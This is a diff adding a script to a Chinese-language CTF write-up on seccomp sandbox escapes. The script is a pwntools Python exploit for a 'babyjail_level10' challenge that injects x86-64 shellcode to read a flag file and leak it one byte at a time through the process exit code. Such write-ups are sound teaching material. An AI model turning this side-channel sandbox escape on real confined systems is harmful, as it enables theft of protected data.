@@ -258,7 +258,36 @@ point_path:
 ### 2.1.5 只允许("read", "exit")<br>
 这种情况就比较搞了。只能利用exit的退出的返回值来泄露flag信息<br>
 但是exit的返回值大小是有限的，要想返回你所需的足够信息，你需要多次调用，这就需要用python来自动化运行了（相信我，你不会希望手打的）<br>
+脚本如下:<br>
+```python
+from pwn import *
 
+flag = ""
+for i in range(57):
+    p = process(["/challenge/babyjail_level10","/flag"])
+    shellcode = """
+        mov rdi, 3
+        lea rsi, [rip+buffer]
+        mov rdx, 0x100
+        mov rax, 0
+        syscall
+
+        xor rdi, rdi
+        mov dil, [rip+buffer+{}]
+        mov rax, 60
+        syscall
+        buffer:
+        .space 0x100
+    """
+    shellcode = shellcode.format(i)
+    #print(shellcode)
+    shellcode = asm(shellcode,arch="amd64")
+    #print(shellcode)
+    p.sendline(shellcode)
+    p.wait()
+    flag += chr(p.returncode)
+print(flag)
+```
 
 
 ## 2.2 利用syscall confusion实现逃逸<br>
